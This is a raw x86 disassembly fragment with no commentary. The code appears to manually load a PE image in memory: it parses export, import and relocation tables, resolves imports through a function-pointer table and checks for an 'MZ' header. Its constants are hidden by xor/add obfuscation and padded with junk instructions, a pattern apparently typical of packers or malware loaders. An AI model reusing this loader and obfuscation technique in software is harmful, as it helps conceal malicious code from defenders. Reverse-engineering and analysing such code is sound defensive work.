  426d62:	movzx  edi,WORD PTR [edx+0xe]
  426d66:	movzx  ebx,WORD PTR [edx+0xc]
  426d6a:	mov    ecx,DWORD PTR [ebp-0x14]
  426d6d:	inc    DWORD PTR [ebp-0xc]
  426d70:	add    ecx,0x8
  426d73:	add    edi,ebx
  426d75:	mov    DWORD PTR [ebp-0x14],ecx
  426d78:	cmp    DWORD PTR [ebp-0xc],edi
  426d7b:	jb     0x426d1d
  426d7d:	mov    ecx,DWORD PTR [ebp-0x18]
  426d80:	movzx  edx,WORD PTR [eax+0xe]
  426d84:	movzx  edi,WORD PTR [eax+0xc]
  426d88:	inc    DWORD PTR [ebp-0x10]
  426d8b:	add    ecx,0x8
  426d8e:	add    edx,edi
  426d90:	mov    DWORD PTR [ebp-0x18],ecx
  426d93:	cmp    DWORD PTR [ebp-0x10],edx
  426d96:	jb     0x426cfd
  426d9c:	pop    edi
  426d9d:	pop    ebx
  426d9e:	xor    eax,eax
  426da0:	inc    eax
  426da1:	jmp    0x426da5
  426da3:	xor    eax,eax
  426da5:	pop    esi
  426da6:	leave  
  426da7:	ret    
  426da8:	push   ebp
  426da9:	mov    ebp,esp
  426dab:	mov    ecx,DWORD PTR [ecx+0x190]
  426db1:	mov    eax,DWORD PTR [ebp+0xc]
  426db4:	sub    esp,0x10
  426db7:	push   ebx
  426db8:	xor    ebx,ebx
  426dba:	push   esi
  426dbb:	push   edi
  426dbc:	cmp    DWORD PTR [ecx],ebx
  426dbe:	je     0x426e46
  426dc4:	cmp    eax,ebx
  426dc6:	je     0x426e46
  426dc8:	cmp    DWORD PTR [eax+0x78],ebx
  426dcb:	jne    0x426dd2
  426dcd:	xor    eax,eax
  426dcf:	inc    eax
  426dd0:	jmp    0x426e48
  426dd2:	mov    eax,DWORD PTR [eax+0x78]
  426dd5:	add    eax,DWORD PTR [ebp+0x8]
  426dd8:	mov    ecx,DWORD PTR [eax+0x1c]
  426ddb:	mov    edx,DWORD PTR [eax+0x24]
  426dde:	mov    esi,DWORD PTR [eax+0x14]
  426de1:	mov    edi,DWORD PTR [eax+0x18]
  426de4:	add    ecx,DWORD PTR [ebp+0x8]
  426de7:	add    edx,DWORD PTR [ebp+0x8]
  426dea:	mov    DWORD PTR [ebp-0x4],esi
  426ded:	cmp    esi,edi
  426def:	ja     0x426df4
  426df1:	mov    DWORD PTR [ebp-0x4],edi
  426df4:	mov    DWORD PTR [ebp-0x8],ebx
  426df7:	cmp    DWORD PTR [ebp-0x4],ebx
  426dfa:	jbe    0x426dcd
  426dfc:	cmp    ebx,DWORD PTR [eax+0x14]
  426dff:	jae    0x426e07
  426e01:	movzx  esi,WORD PTR [edx+ebx*2]
  426e05:	jmp    0x426e09
  426e07:	mov    esi,ebx
  426e09:	lea    esi,[ecx+esi*4]
  426e0c:	mov    edi,DWORD PTR [esi]
  426e0e:	test   edi,edi
  426e10:	je     0x426e3b
  426e12:	add    edi,DWORD PTR [ebp+0x8]
  426e15:	mov    DWORD PTR [ebp-0x10],edi
  426e18:	cmp    edi,eax
  426e1a:	jbe    0x426e2c
  426e1c:	mov    ebx,DWORD PTR [ebp+0xc]
  426e1f:	mov    ebx,DWORD PTR [ebx+0x7c]
  426e22:	add    ebx,eax
  426e24:	cmp    edi,ebx
  426e26:	jae    0x426e2c
  426e28:	mov    esi,DWORD PTR [esi]
  426e2a:	jmp    0x426e34
  426e2c:	sub    edi,DWORD PTR [ebp+0x8]
  426e2f:	mov    DWORD PTR [esi],edi
  426e31:	mov    esi,DWORD PTR [ebp-0x10]
  426e34:	test   esi,esi
  426e36:	je     0x426e46
  426e38:	mov    ebx,DWORD PTR [ebp-0x8]
  426e3b:	inc    ebx
  426e3c:	mov    DWORD PTR [ebp-0x8],ebx
  426e3f:	cmp    ebx,DWORD PTR [ebp-0x4]
  426e42:	jb     0x426dfc
  426e44:	jmp    0x426dcd
  426e46:	xor    eax,eax
  426e48:	pop    edi
  426e49:	pop    esi
  426e4a:	pop    ebx
  426e4b:	leave  
  426e4c:	ret    0x8
  426e4f:	push   ebp
  426e50:	mov    ebp,esp
  426e52:	sub    esp,0x2c
  426e55:	mov    edx,0xf89c85a5
  426e5a:	mov    DWORD PTR [ebp-0x4],edx
  426e5d:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  426e64:	mov    eax,DWORD PTR [ebp-0x4]
  426e67:	mov    ecx,DWORD PTR [ebp-0x4]
  426e6a:	mov    ecx,DWORD PTR [ebp-0x4]
  426e6d:	mov    ecx,DWORD PTR [ebp-0x4]
  426e70:	mov    ecx,DWORD PTR [ebp-0x4]
  426e73:	mov    ecx,DWORD PTR [ebp-0x4]
  426e76:	push   ebx
  426e77:	mov    ebx,DWORD PTR [ebp+0x10]
  426e7a:	push   esi
  426e7b:	mov    esi,0x75108aa
  426e80:	mov    DWORD PTR [ebp-0x10],0x352eb2f
  426e87:	mov    ecx,DWORD PTR [ebp-0x4]
  426e8a:	mov    ebx,DWORD PTR [ebx+0x190]
  426e90:	push   edi
  426e91:	mov    edi,0x3272f1
  426e96:	xor    ecx,esi
  426e98:	xor    eax,esi
  426e9a:	add    eax,edi
  426e9c:	add    ecx,edi
  426e9e:	mov    DWORD PTR [ebp-0x18],eax
  426ea1:	cmp    ecx,DWORD PTR [ebx]
  426ea3:	je     0x427124
  426ea9:	mov    ebx,DWORD PTR [ebp-0x4]
  426eac:	mov    ecx,DWORD PTR [ebp+0xc]
  426eaf:	xor    ebx,esi
  426eb1:	add    ebx,edi
  426eb3:	cmp    ebx,ecx
  426eb5:	je     0x427124
  426ebb:	mov    ebx,DWORD PTR [ebp-0x4]
  426ebe:	mov    ecx,DWORD PTR [ecx+0x80]
  426ec4:	xor    ebx,esi
  426ec6:	add    ebx,edi
  426ec8:	cmp    ecx,ebx
  426eca:	je     0x42711f
  426ed0:	add    ecx,DWORD PTR [ebp+0x8]
  426ed3:	mov    DWORD PTR [ebp-0x2c],ecx
  426ed6:	mov    ebx,edx
  426ed8:	xor    ebx,esi
  426eda:	add    ebx,edi
  426edc:	mov    DWORD PTR [ebp-0x10],ebx
  426edf:	mov    ebx,DWORD PTR [ebp-0x10]
  426ee2:	cmp    ebx,edx
  426ee4:	je     0x426ef8
  426ee6:	mov    edx,DWORD PTR [ebp-0x10]
  426ee9:	mov    ebx,DWORD PTR [ebp-0x4]
  426eec:	imul   edx,edx,0x14
  426eef:	xor    ebx,esi
  426ef1:	add    ebx,edi
  426ef3:	cmp    DWORD PTR [edx+ecx*1],ebx
  426ef6:	jne    0x426f0f
  426ef8:	mov    edx,DWORD PTR [ebp-0x10]
  426efb:	mov    ebx,DWORD PTR [ebp-0x4]
  426efe:	imul   edx,edx,0x14
  426f01:	xor    ebx,esi
  426f03:	add    ebx,edi
  426f05:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  426f09:	je     0x427111
  426f0f:	mov    eax,DWORD PTR [ebp-0x4]
  426f12:	mov    ebx,DWORD PTR [ebp-0x4]
  426f15:	mov    eax,DWORD PTR [ebp-0x10]
  426f18:	imul   eax,eax,0x14
  426f1b:	add    eax,ecx
  426f1d:	mov    ecx,DWORD PTR [eax+0x10]
  426f20:	add    ecx,DWORD PTR [ebp+0x8]
  426f23:	xor    ebx,esi
  426f25:	mov    DWORD PTR [ebp-0x1c],ecx
  426f28:	mov    ecx,DWORD PTR [ebp-0x4]
  426f2b:	mov    edx,DWORD PTR [ebp-0x4]
  426f2e:	xor    ecx,esi
  426f30:	add    ecx,edi
  426f32:	xor    edx,esi
  426f34:	mov    DWORD PTR [ebp-0x24],ecx
  426f37:	mov    ecx,DWORD PTR [eax]
  426f39:	add    edx,edi
  426f3b:	add    ebx,edi
  426f3d:	cmp    ecx,edx
  426f3f:	je     0x426f47
  426f41:	add    ecx,DWORD PTR [ebp+0x8]
  426f44:	mov    DWORD PTR [ebp-0x24],ecx
  426f47:	mov    ecx,DWORD PTR [ebp-0x4]
  426f4a:	xor    ecx,esi
  426f4c:	add    ecx,DWORD PTR [eax+0xc]
  426f4f:	mov    eax,DWORD PTR [ebp+0x8]
  426f52:	lea    eax,[ecx+eax*1+0x3272f1]
  426f59:	mov    DWORD PTR [ebp+0xc],eax
  426f5c:	mov    DWORD PTR [ebp-0x28],0xf89c85be
  426f63:	mov    eax,DWORD PTR [ebp+0x10]
  426f66:	push   DWORD PTR [ebp+0xc]
  426f69:	mov    eax,DWORD PTR [eax+0x1e0]
  426f6f:	call   DWORD PTR [eax]
  426f71:	mov    ecx,DWORD PTR [ebp-0x4]
  426f74:	xor    ecx,esi
  426f76:	add    ecx,edi
  426f78:	mov    DWORD PTR [ebp-0xc],eax
  426f7b:	cmp    ecx,eax
  426f7d:	jne    0x426f91
  426f7f:	mov    eax,DWORD PTR [ebp+0x10]
  426f82:	push   DWORD PTR [ebp+0xc]
  426f85:	mov    eax,DWORD PTR [eax+0x1e0]
  426f8b:	call   DWORD PTR [eax+0xc]
  426f8e:	mov    DWORD PTR [ebp-0xc],eax
  426f91:	mov    DWORD PTR [ebp-0x20],0x7f661b22
  426f98:	mov    DWORD PTR [ebp-0x20],0xf89c9852
  426f9f:	mov    eax,DWORD PTR [ebp-0x4]
  426fa2:	xor    eax,esi
  426fa4:	add    eax,edi
  426fa6:	cmp    eax,DWORD PTR [ebp-0xc]
  426fa9:	jne    0x426fce
  426fab:	mov    eax,DWORD PTR [ebp-0x8]
  426fae:	mov    ecx,DWORD PTR [ebp-0x20]
  426fb1:	xor    eax,esi
  426fb3:	xor    ecx,esi
  426fb5:	lea    ebx,[ebx+eax*1+0x3272f1]
  426fbc:	mov    eax,DWORD PTR [ebp+0x10]
  426fbf:	mov    eax,DWORD PTR [eax+0x1e0]
  426fc5:	add    ecx,edi
  426fc7:	imul   ecx,ebx
  426fca:	push   ecx
  426fcb:	call   DWORD PTR [eax+0x24]
  426fce:	mov    eax,DWORD PTR [ebp-0x4]
  426fd1:	xor    eax,esi
  426fd3:	add    eax,edi
  426fd5:	cmp    eax,DWORD PTR [ebp-0xc]
  426fd8:	jne    0x426fe9
  426fda:	mov    eax,DWORD PTR [ebp-0x28]
  426fdd:	xor    eax,esi
  426fdf:	add    eax,edi
  426fe1:	cmp    ebx,eax
  426fe3:	jbe    0x426f63
  426fe9:	mov    eax,DWORD PTR [ebp-0x4]
  426fec:	xor    eax,esi
  426fee:	add    eax,edi
  426ff0:	cmp    eax,DWORD PTR [ebp-0xc]
  426ff3:	jne    0x42700c
  426ff5:	mov    eax,DWORD PTR [ebp-0x8]
  426ff8:	mov    ecx,DWORD PTR [ebp-0x18]
  426ffb:	xor    eax,esi
  426ffd:	lea    eax,[ecx+eax*1+0x3272f1]
  427004:	mov    DWORD PTR [ebp-0x18],eax
  427007:	jmp    0x4270fb
  42700c:	mov    DWORD PTR [ebp-0x14],0x1121b2d
  427013:	mov    DWORD PTR [ebp+0xc],0xe042d2f
  42701a:	mov    ebx,DWORD PTR [ebp-0x4]
  42701d:	xor    ebx,esi
  42701f:	add    ebx,edi
  427021:	jmp    0x4270e8
  427026:	mov    eax,DWORD PTR [ebp-0x4]
  427029:	xor    eax,esi
  42702b:	add    eax,edi
  42702d:	mov    DWORD PTR [ebp-0x14],eax
  427030:	mov    eax,DWORD PTR [ebp-0x4]
  427033:	xor    eax,esi
  427035:	add    eax,edi
  427037:	mov    DWORD PTR [ebp+0xc],eax
  42703a:	mov    ecx,DWORD PTR [ebp-0x4]
  42703d:	mov    eax,DWORD PTR [ebp-0x24]
  427040:	xor    ecx,esi
  427042:	add    ecx,edi
  427044:	cmp    ecx,eax
  427046:	je     0x42704e
  427048:	mov    eax,DWORD PTR [eax+ebx*4]
  42704b:	mov    DWORD PTR [ebp-0x14],eax
  42704e:	mov    eax,DWORD PTR [ebp-0x1c]
  427051:	mov    eax,DWORD PTR [eax+ebx*4]
  427054:	mov    DWORD PTR [ebp+0xc],eax
  427057:	mov    eax,DWORD PTR [ebp-0x4]
  42705a:	mov    ecx,DWORD PTR [ebp-0x14]
  42705d:	xor    eax,esi
  42705f:	add    eax,edi
  427061:	cmp    eax,ecx
  427063:	je     0x42708e
  427065:	mov    eax,DWORD PTR [ebp-0x4]
  427068:	mov    ecx,DWORD PTR [ebp-0x14]
  42706b:	xor    eax,esi
  42706d:	add    eax,edi
  42706f:	shr    ecx,0x1f
  427072:	cmp    eax,ecx
  427074:	je     0x42708e
  427076:	mov    ecx,DWORD PTR [ebp-0x14]
  427079:	mov    eax,DWORD PTR [ebp+0x10]
  42707c:	mov    eax,DWORD PTR [eax+0x1e0]
  427082:	movzx  ecx,cx
  427085:	push   ecx
  427086:	push   DWORD PTR [ebp-0xc]
  427089:	call   DWORD PTR [eax+0x8]
  42708c:	jmp    0x4270a7
  42708e:	mov    eax,DWORD PTR [ebp+0xc]
  427091:	add    eax,DWORD PTR [ebp+0x8]
  427094:	mov    ecx,DWORD PTR [ebp+0x10]
  427097:	mov    ecx,DWORD PTR [ecx+0x1e0]
  42709d:	add    eax,0x2
  4270a0:	push   eax
  4270a1:	push   DWORD PTR [ebp-0xc]
  4270a4:	call   DWORD PTR [ecx+0x8]
  4270a7:	mov    DWORD PTR [ebp+0xc],eax
  4270aa:	mov    eax,DWORD PTR [ebp-0x4]
  4270ad:	mov    ecx,DWORD PTR [ebp+0xc]
  4270b0:	xor    eax,esi
  4270b2:	add    eax,edi
  4270b4:	cmp    eax,ecx
  4270b6:	mov    eax,DWORD PTR [ebp-0x8]
  4270b9:	jne    0x4270cc
  4270bb:	mov    ecx,DWORD PTR [ebp-0x18]
  4270be:	xor    eax,esi
  4270c0:	lea    eax,[ecx+eax*1+0x3272f1]
  4270c7:	mov    DWORD PTR [ebp-0x18],eax
  4270ca:	jmp    0x4270dc
  4270cc:	mov    ecx,DWORD PTR [ebp+0xc]
  4270cf:	xor    eax,esi
  4270d1:	add    eax,edi
  4270d3:	imul   eax,ecx
  4270d6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4270d9:	mov    DWORD PTR [ecx+ebx*4],eax
  4270dc:	mov    eax,DWORD PTR [ebp-0x8]
  4270df:	xor    eax,esi
  4270e1:	lea    ebx,[ebx+eax*1+0x3272f1]
  4270e8:	mov    eax,DWORD PTR [ebp-0x4]
  4270eb:	mov    ecx,DWORD PTR [ebp-0x1c]
  4270ee:	xor    eax,esi
  4270f0:	add    eax,edi
  4270f2:	cmp    DWORD PTR [ecx+ebx*4],eax
  4270f5:	jne    0x427026
  4270fb:	mov    edx,DWORD PTR [ebp-0x10]
  4270fe:	mov    ecx,DWORD PTR [ebp-0x2c]
  427101:	mov    eax,DWORD PTR [ebp-0x18]
  427104:	sub    edx,0x3272f0
  42710a:	xor    edx,esi
  42710c:	jmp    0x426ed6
  427111:	mov    ecx,DWORD PTR [ebp-0x4]
  427114:	xor    ecx,esi
  427116:	add    ecx,edi
  427118:	cmp    eax,ecx
  42711a:	mov    eax,DWORD PTR [ebp-0x4]
  42711d:	jne    0x427127
  42711f:	mov    eax,DWORD PTR [ebp-0x8]
  427122:	jmp    0x427127
  427124:	mov    eax,DWORD PTR [ebp-0x4]
  427127:	xor    eax,esi
  427129:	add    eax,edi
  42712b:	pop    edi
  42712c:	pop    esi
  42712d:	pop    ebx
  42712e:	leave  
  42712f:	ret    0xc
  427132:	push   ebp
  427133:	mov    ebp,esp
  427135:	sub    esp,0x28
  427138:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  42713f:	mov    DWORD PTR [ebp-0x28],0xf89c85ba
  427146:	mov    eax,DWORD PTR [ebp+0xc]
  427149:	mov    DWORD PTR [ebp+0xc],eax
  42714c:	push   esi
  42714d:	mov    eax,eax
  42714f:	mov    eax,DWORD PTR [ebp-0x4]
  427152:	mov    esi,DWORD PTR [ebp+0x8]
  427155:	mov    ecx,0x75108aa
  42715a:	xor    eax,ecx
  42715c:	mov    edx,0x3272f1
  427161:	add    eax,edx
  427163:	cmp    esi,eax
  427165:	je     0x42728c
  42716b:	mov    eax,DWORD PTR [ebp+0x8]
  42716e:	mov    esi,DWORD PTR [ebp+0x8]
  427171:	add    esi,DWORD PTR [eax+0x3c]
  427174:	push   edi
  427175:	mov    DWORD PTR [ebp+0xc],esi
  427178:	mov    DWORD PTR [ebp-0x1c],0xf89c85be
  42717f:	mov    eax,DWORD PTR [ebp-0x1c]
  427182:	mov    esi,DWORD PTR [ebp-0x4]
  427185:	mov    edi,DWORD PTR [ebp+0xc]
  427188:	xor    esi,ecx
  42718a:	xor    eax,ecx
  42718c:	add    esi,edx
  42718e:	cmp    DWORD PTR [edi+eax*8+0x1939800],esi
  427195:	je     0x427286
  42719b:	mov    esi,DWORD PTR [ebp+0xc]
  42719e:	mov    eax,DWORD PTR [ebp+0x8]
  4271a1:	add    eax,DWORD PTR [esi+0xa0]
  4271a7:	mov    esi,DWORD PTR [ebp+0x8]
  4271aa:	mov    edi,DWORD PTR [ebp+0xc]
  4271ad:	sub    esi,DWORD PTR [edi+0x34]
  4271b0:	mov    edi,DWORD PTR [ebp-0x4]
  4271b3:	xor    edi,ecx
  4271b5:	add    edi,edx
  4271b7:	mov    DWORD PTR [ebp-0x24],esi
  4271ba:	cmp    esi,edi
  4271bc:	je     0x427286
  4271c2:	mov    esi,DWORD PTR [ebp-0x4]
  4271c5:	xor    esi,ecx
  4271c7:	add    esi,edx
  4271c9:	mov    DWORD PTR [ebp-0x8],esi
  4271cc:	push   ebx
  4271cd:	mov    DWORD PTR [ebp-0x10],0xf89c85b8
  4271d4:	jmp    0x427270
  4271d9:	mov    esi,DWORD PTR [ebp-0x4]
  4271dc:	xor    esi,ecx
  4271de:	lea    edi,[ebx-0x8]
  4271e1:	add    esi,edx
  4271e3:	shr    edi,1
  4271e5:	cmp    esi,edi
  4271e7:	jae    0x427256
  4271e9:	sub    edi,esi
  4271eb:	lea    ebx,[eax+esi*2+0x8]
  4271ef:	mov    DWORD PTR [ebp-0x18],edi
  4271f2:	movzx  esi,WORD PTR [ebx]
  4271f5:	and    esi,0xfff
  4271fb:	mov    DWORD PTR [ebp-0x14],esi
  4271fe:	mov    edi,DWORD PTR [ebp-0x14]
  427201:	mov    esi,DWORD PTR [eax]
  427203:	sub    esi,edx
  427205:	add    edi,esi
  427207:	movzx  esi,WORD PTR [ebx]
  42720a:	shr    esi,0xc
  42720d:	xor    edi,ecx
  42720f:	mov    DWORD PTR [ebp-0x20],edi
  427212:	mov    DWORD PTR [ebp-0x14],esi
  427215:	mov    esi,DWORD PTR [ebp-0x20]
  427218:	mov    edi,DWORD PTR [ebp+0x8]
  42721b:	xor    esi,ecx
  42721d:	lea    esi,[esi+edi*1+0x3272f1]
  427224:	mov    DWORD PTR [ebp-0x20],esi
  427227:	mov    esi,DWORD PTR [ebp-0x10]
  42722a:	mov    edi,DWORD PTR [ebp-0x14]
  42722d:	xor    esi,ecx
  42722f:	add    esi,edx
  427231:	cmp    edi,esi
  427233:	jne    0x42724b
  427235:	mov    esi,DWORD PTR [ebp-0x10]
  427238:	mov    edi,DWORD PTR [ebp-0x14]
  42723b:	xor    esi,ecx
  42723d:	add    esi,edx
  42723f:	cmp    edi,esi
  427241:	jne    0x42724b
  427243:	mov    esi,DWORD PTR [ebp-0x20]
  427246:	mov    edi,DWORD PTR [ebp-0x24]
  427249:	add    DWORD PTR [esi],edi
  42724b:	add    ebx,0x2
  42724e:	dec    DWORD PTR [ebp-0x18]
  427251:	jne    0x4271f2
  427253:	mov    ebx,DWORD PTR [ebp-0xc]
  427256:	add    DWORD PTR [ebp-0x8],ebx
  427259:	mov    esi,DWORD PTR [ebp-0x1c]
  42725c:	mov    edi,DWORD PTR [ebp-0x8]
  42725f:	mov    ebx,DWORD PTR [ebp+0xc]
  427262:	xor    esi,ecx
  427264:	cmp    edi,DWORD PTR [ebx+esi*8+0x1939804]
  42726b:	jae    0x427285
  42726d:	add    eax,DWORD PTR [ebp-0xc]
  427270:	mov    esi,DWORD PTR [ebp-0x4]
  427273:	mov    ebx,DWORD PTR [eax+0x4]
  427276:	xor    esi,ecx
  427278:	add    esi,edx
  42727a:	mov    DWORD PTR [ebp-0xc],ebx
  42727d:	cmp    ebx,esi
  42727f:	jne    0x4271d9
  427285:	pop    ebx
  427286:	mov    eax,DWORD PTR [ebp-0x28]
  427289:	pop    edi
  42728a:	jmp    0x42728f
  42728c:	mov    eax,DWORD PTR [ebp-0x4]
  42728f:	xor    eax,ecx
  427291:	add    eax,edx
  427293:	pop    esi
  427294:	leave  
  427295:	ret    0x8
  427298:	push   ebp
  427299:	mov    ebp,esp
  42729b:	sub    esp,0xd8
  4272a1:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  4272a8:	mov    DWORD PTR [ebp-0x24],0xf89c85ba
  4272af:	mov    eax,DWORD PTR [ebp-0x4]
  4272b2:	push   ebx
  4272b3:	push   esi
  4272b4:	mov    esi,0x75108aa
  4272b9:	xor    eax,esi
  4272bb:	push   edi
  4272bc:	mov    edi,0x3272f1
  4272c1:	add    eax,edi
  4272c3:	mov    DWORD PTR [ebp-0x18],eax
  4272c6:	mov    eax,DWORD PTR [ebp-0x4]
  4272c9:	xor    eax,esi
  4272cb:	add    eax,edi
  4272cd:	mov    DWORD PTR [ebp-0x8],eax
  4272d0:	mov    ebx,DWORD PTR [ebp+0x20]
  4272d3:	mov    eax,DWORD PTR [ebp-0x1c]
  4272d6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4272d9:	xor    eax,ecx
  4272db:	mov    DWORD PTR [ebp-0x1c],eax
  4272de:	add    DWORD PTR [ebp-0x1c],0xf89cb5a5
  4272e5:	mov    eax,DWORD PTR [ebp-0xc]
  4272e8:	mov    ecx,DWORD PTR [ebp-0xc]
  4272eb:	xor    eax,ecx
  4272ed:	mov    DWORD PTR [ebp-0xc],eax
  4272f0:	add    DWORD PTR [ebp-0xc],0xf89c85e5
  4272f7:	mov    eax,DWORD PTR [ebp-0x10]
  4272fa:	mov    ecx,DWORD PTR [ebp-0x10]
  4272fd:	xor    eax,ecx
  4272ff:	mov    DWORD PTR [ebp-0x10],eax
  427302:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  427309:	mov    eax,DWORD PTR [ebp-0x28]
  42730c:	mov    ecx,DWORD PTR [ebp-0x28]
  42730f:	xor    eax,ecx
  427311:	mov    DWORD PTR [ebp-0x28],eax
  427314:	add    DWORD PTR [ebp-0x28],0xf89f05a5
  42731b:	mov    DWORD PTR [ebp+0x20],0xf89ceff6
  427322:	mov    eax,DWORD PTR [ebp+0x8]
  427325:	test   eax,eax
  427327:	je     0x4277b0
  42732d:	mov    eax,DWORD PTR [ebp+0xc]
  427330:	test   eax,eax
  427332:	je     0x4277b0
  427338:	mov    eax,DWORD PTR [ebp+0x18]
  42733b:	test   eax,eax
  42733d:	je     0x4277b0
  427343:	mov    eax,DWORD PTR [ebp+0x20]
  427346:	mov    ecx,DWORD PTR [ebp+0x8]
  427349:	xor    eax,0x8aa
  42734e:	add    eax,0x72f1
  427353:	cmp    WORD PTR [ecx],ax
  427356:	jne    0x4277b0
  42735c:	mov    eax,DWORD PTR [ebp-0x4]
  42735f:	xor    eax,esi
  427361:	add    eax,edi
  427363:	mov    DWORD PTR [ebp-0x30],eax
  427366:	mov    eax,DWORD PTR [ebp-0x4]
  427369:	mov    ecx,DWORD PTR [ebp+0x8]
  42736c:	mov    eax,DWORD PTR [ebp+0x8]
  42736f:	add    eax,DWORD PTR [ecx+0x3c]
  427372:	mov    DWORD PTR [ebp+0xc],eax
  427375:	mov    eax,DWORD PTR [eax+0x50]
  427378:	test   eax,eax
  42737a:	je     0x4277b0
  427380:	mov    DWORD PTR [ebp-0x2c],0xf88c85a5
  427387:	mov    eax,DWORD PTR [ebp-0x2c]
  42738a:	xor    eax,esi
  42738c:	add    eax,edi
  42738e:	mov    DWORD PTR [ebp-0x2c],eax
  427391:	mov    eax,DWORD PTR [ebp-0x4]
  427394:	mov    eax,DWORD PTR [ebx+0x190]
  42739a:	mov    ecx,DWORD PTR [eax]
  42739c:	mov    ecx,DWORD PTR [ecx+0x3c]
  42739f:	add    ecx,DWORD PTR [eax]
  4273a1:	mov    eax,DWORD PTR [ebp-0x4]
  4273a4:	mov    eax,DWORD PTR [ebx+0x18c]
  4273aa:	mov    edx,DWORD PTR [eax]
  4273ac:	mov    DWORD PTR [ebp-0x20],ecx
  4273af:	mov    DWORD PTR [ebp+0x20],edx
  4273b2:	cmp    edx,edx
  4273b4:	jne    0x4273e8
  4273b6:	mov    eax,DWORD PTR [ebx+0x1e0]
  4273bc:	lea    edx,[ebp-0x18]
  4273bf:	push   edx
  4273c0:	mov    edx,DWORD PTR [ebp-0xc]
  4273c3:	xor    edx,esi
  4273c5:	add    edx,edi
  4273c7:	push   edx
  4273c8:	push   DWORD PTR [ecx+0x50]
  4273cb:	push   DWORD PTR [ebp+0x20]
  4273ce:	call   DWORD PTR [eax+0x1c]
  4273d1:	mov    eax,DWORD PTR [ebp-0x20]
  4273d4:	mov    ecx,DWORD PTR [eax+0x54]
  4273d7:	mov    eax,DWORD PTR [eax+0x50]
  4273da:	sub    eax,ecx
  4273dc:	add    ecx,DWORD PTR [ebp+0x20]
  4273df:	push   ecx
  4273e0:	call   0x427d4b
  4273e5:	mov    edx,DWORD PTR [ebp+0x20]
  4273e8:	mov    eax,DWORD PTR [ebx+0x194]
  4273ee:	mov    DWORD PTR [eax],edx
  4273f0:	mov    eax,DWORD PTR [ebp+0xc]
  4273f3:	push   DWORD PTR [eax+0x54]
  4273f6:	push   DWORD PTR [ebp+0x8]
  4273f9:	push   edx
  4273fa:	call   0x427c41
  4273ff:	mov    ecx,DWORD PTR [ebp+0x20]
  427402:	mov    eax,DWORD PTR [ecx+0x3c]
  427405:	add    eax,ecx
  427407:	movzx  ecx,WORD PTR [eax+0x14]
  42740b:	lea    ecx,[ecx+eax*1+0x18]
  42740f:	mov    DWORD PTR [ebp+0x18],ecx
  427412:	mov    ecx,DWORD PTR [ebp-0x4]
  427415:	movzx  edx,WORD PTR [eax+0x6]
  427419:	xor    ecx,esi
  42741b:	add    ecx,edi
  42741d:	mov    DWORD PTR [ebp+0xc],eax
  427420:	cmp    edx,ecx
  427422:	je     0x4274cf
  427428:	mov    ecx,DWORD PTR [ebp-0x4]
  42742b:	xor    ecx,esi
  42742d:	add    ecx,edi
  42742f:	mov    DWORD PTR [ebp-0x8],ecx
  427432:	mov    ecx,DWORD PTR [ebp-0x24]
  427435:	movzx  edx,WORD PTR [eax+0x6]
  427439:	xor    ecx,esi
  42743b:	sub    edx,ecx
  42743d:	sub    edx,edi
  42743f:	cmp    DWORD PTR [ebp-0x8],edx
  427442:	ja     0x4274cf
  427448:	mov    edx,DWORD PTR [ebp+0x18]
  42744b:	add    edx,0x8
  42744e:	mov    DWORD PTR [ebp+0x18],edx
  427451:	jmp    0x427456
  427453:	mov    edx,DWORD PTR [ebp+0x18]
  427456:	mov    eax,DWORD PTR [eax+0x38]
  427459:	lea    ecx,[eax-0x1]
  42745c:	mov    DWORD PTR [ebp-0x38],eax
  42745f:	mov    eax,DWORD PTR [edx]
  427461:	test   eax,ecx
  427463:	je     0x42746c
  427465:	not    ecx
  427467:	and    eax,ecx
  427469:	add    eax,DWORD PTR [ebp-0x38]
  42746c:	mov    ecx,DWORD PTR [edx+0x4]
  42746f:	add    ecx,DWORD PTR [ebp+0x20]
  427472:	push   ecx
  427473:	call   0x427d4b
  427478:	mov    edx,DWORD PTR [ebp-0x4]
  42747b:	mov    eax,DWORD PTR [ebp+0x18]
  42747e:	mov    ecx,DWORD PTR [eax+0x8]
  427481:	xor    edx,esi
  427483:	add    edx,edi
  427485:	cmp    ecx,edx
  427487:	je     0x4274a0
  427489:	push   ecx
  42748a:	mov    ecx,DWORD PTR [ebp+0x8]
  42748d:	add    ecx,DWORD PTR [eax+0xc]
  427490:	mov    eax,DWORD PTR [eax+0x4]
  427493:	add    eax,DWORD PTR [ebp+0x20]
  427496:	push   ecx
  427497:	push   eax
  427498:	call   0x427c41
  42749d:	mov    eax,DWORD PTR [ebp+0x18]
  4274a0:	mov    ecx,DWORD PTR [ebp-0x24]
  4274a3:	mov    edx,DWORD PTR [ebp-0x8]
  4274a6:	add    eax,0x28
  4274a9:	xor    ecx,esi
  4274ab:	lea    ecx,[edx+ecx*1+0x3272f1]
  4274b2:	mov    edx,DWORD PTR [ebp+0xc]
  4274b5:	mov    DWORD PTR [ebp+0x18],eax
  4274b8:	mov    eax,DWORD PTR [ebp-0x24]
  4274bb:	movzx  edx,WORD PTR [edx+0x6]
  4274bf:	xor    eax,esi
  4274c1:	sub    edx,eax
  4274c3:	mov    eax,DWORD PTR [ebp+0xc]
  4274c6:	sub    edx,edi
  4274c8:	mov    DWORD PTR [ebp-0x8],ecx
  4274cb:	cmp    ecx,edx
  4274cd:	jbe    0x427453
  4274cf:	mov    edx,DWORD PTR [ebx+0x18c]
  4274d5:	mov    ecx,DWORD PTR [ebp+0x20]
  4274d8:	cmp    ecx,DWORD PTR [edx]
  4274da:	jne    0x427503
  4274dc:	mov    eax,DWORD PTR [ebx+0x1e0]
  4274e2:	lea    edx,[ebp-0x18]
  4274e5:	push   edx
  4274e6:	mov    edx,DWORD PTR [ebp-0x10]
  4274e9:	xor    edx,esi
  4274eb:	add    edx,edi
  4274ed:	push   edx
  4274ee:	mov    edx,DWORD PTR [ebp-0x20]
  4274f1:	push   DWORD PTR [edx+0x54]
  4274f4:	push   ecx
  4274f5:	call   DWORD PTR [eax+0x1c]
  4274f8:	test   eax,eax
  4274fa:	je     0x4277a1
  427500:	mov    eax,DWORD PTR [ebp+0xc]
  427503:	mov    ecx,DWORD PTR [ebx+0x1c8]
  427509:	mov    ecx,DWORD PTR [ecx]
  42750b:	xor    ecx,esi
